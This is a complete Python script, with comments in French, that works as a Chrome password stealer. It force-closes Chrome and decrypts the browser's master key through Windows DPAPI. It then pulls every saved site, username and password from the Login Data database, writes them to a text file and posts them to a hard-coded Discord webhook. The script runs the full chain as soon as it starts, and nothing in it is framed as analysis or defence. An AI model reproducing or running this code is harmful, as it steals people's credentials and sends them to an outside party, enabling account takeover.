import os
import sqlite3
from Cryptodome.Cipher import AES
import json
import base64
import win32crypt
import requests

# Sépare tes identifiants pour des raisons de sécurité
url = "https://discord.com/api/webhooks/1186957152888295474/GxNMCIjSd6_mCKcFx9CWHBj4eXn-KiWZWmHan1bPKEPgQMA5JoMIUrEfsgjlSdBqYjPl"

def closeChrome():
    try:
        os.system("taskkill /f /im chrome.exe")
    except:
        pass

def getSecretKey():
    try:
        with open(os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE'])), "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("Secret key not found")

def decryptPayload(cipher, payload):
    return cipher.decrypt(payload)

def generateCipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decryptPassword(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generateCipher(secret_key, initialisation_vector)
        decrypted_pass = decryptPayload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except:
        print("Cannot decrypt password")

def getChromePasswords():
    data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
    c = sqlite3.connect(data_path)
    cursor = c.cursor()
    select_statement = 'SELECT origin_url, username_value, password_value FROM logins'
    cursor.execute(select_statement)
    login_data = cursor.fetchall()
    extractedData = []
    for userdatacombo in login_data:
        if userdatacombo[1] != None and userdatacombo[2] != None and userdatacombo[1] != ""  and userdatacombo[2] != "":
            password = decryptPassword(userdatacombo[2], getSecretKey())
            data = f"**URL:** {userdatacombo[0]}\n**Username:** {userdatacombo[1]}\n**Password:** {str(password)}\n\n---\n"  # Ajoute un saut de ligne et une ligne de délimitation
            extractedData.append(data)
        else:
            pass
    return extractedData

def savePasswords(data):
    with open("passwords.txt", "w") as f:
        for line in data:
            f.write(line + "\n")

def sendToDiscord(data):
    embed = {
        "embeds": [
            {
                "title": "__Chrome Passwords__",  # Souligne le titre en utilisant des underscores
                "description": "\n".join(data),
                "color": 16711680  # Tu peux définir le code couleur de ton choix ici
            }
        ]
    }
    requests.post(url, json=embed)

def main():
    closeChrome()
    data = getChromePasswords()
    savePasswords(data)
    sendToDiscord(data)

main()
